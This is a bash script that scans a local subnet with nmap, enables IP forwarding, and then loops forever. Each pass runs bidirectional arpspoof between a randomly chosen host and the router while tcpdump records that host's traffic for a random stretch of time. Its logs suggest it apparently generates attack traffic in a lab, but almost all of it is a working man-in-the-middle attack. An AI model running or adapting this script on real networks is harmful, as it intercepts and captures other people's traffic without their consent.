#!/bin/bash

me=$$
i=0

#get the IPs on the network
IPS=$(nmap -n -sn 192.168.200.0/24 -oG - | awk '/Up$/{print $2}')
arrIPS=($IPS)
router=" 192.168.200.1"
#arpspoof -i wlan0 -t 192.168.0.70 192.168.0.1
Arpspoof="arpspoof -i wlan0 -t "


printf "\n !*!*! Starting arpspoof attacks for the following IPs\n: $IPS" 2>&1 | tee -a arpspoof_output/arpspoof_log.txt

printf "Setting IP forwarding : "
#Set up IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip\_forward

printf "\n\n"

while true
do 
    i=$((i+1))
    RANDOM=$$$(date +%s)
    Random_IP=${arrIPS[$RANDOM % ${#arrIPS[@]} ]}

    if [ "$Random_IP" = "192.168.200.1" ]; then
        printf "$i) router\'s IP\n" 2>&1 | tee -a dos_output/dos_log.txt
    elif [ "$Random_IP" = "192.168.200.134" ]; then
        printf "$i) attacker\'s IP\n" 2>&1 | tee -a dos_output/dos_log.txt
    elif [ "$Random_IP" = "192.168.200.2" ]; then
        printf "$i) restricted IP\n" 2>&1 | tee -a dos_output/dos_log.txt
    elif [ "$Random_IP" = "192.168.200.3" ]; then
        printf "$i) restricted IP\n" 2>&1 | tee -a dos_output/dos_log.txt
    else
        start_current_time=$(date "+%Y.%m.%d-%H.%M.%S")

        printf "\n\n*** $start_current_time Executing : $Arpspoof$Random_IP$router\n\n"

        printf $(eval $Arpspoof$Random_IP$router) & scriptARP1=$!
        printf $(eval $Arpspoof$router$Random_IP) & scriptARP2=$!
        Tcpdump="tcpdump -i wlan0 -s 65535 -w /arpspoof_tcpdump/tcpdump$i-$Random_IP"
        printf $(eval $Tcpdump) & scriptTCPDUMP=$!

        Random_Time=$(shuf -i30-600 -n1) #from 30 sec to 10 minutes
        sleep $Random_Time #change to Random_Time
        ps -p $scriptTCPDUMP #delete - just to check
        kill -INT $scriptTCPDUMP
        ps -p $scriptTCPDUMP #delete - just to check
        kill -INT $scriptARP1
        kill -INT $scriptARP2

        stop_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
        printf "\n $i) start: $start_current_time , stop: $stop_current_time [duration: $Random_Time] \' $Arpspoof$Random_IP$router \' \n" 2>&1 | tee -a arpspoof_output/arpspoof_log.txt
    fi
    
done

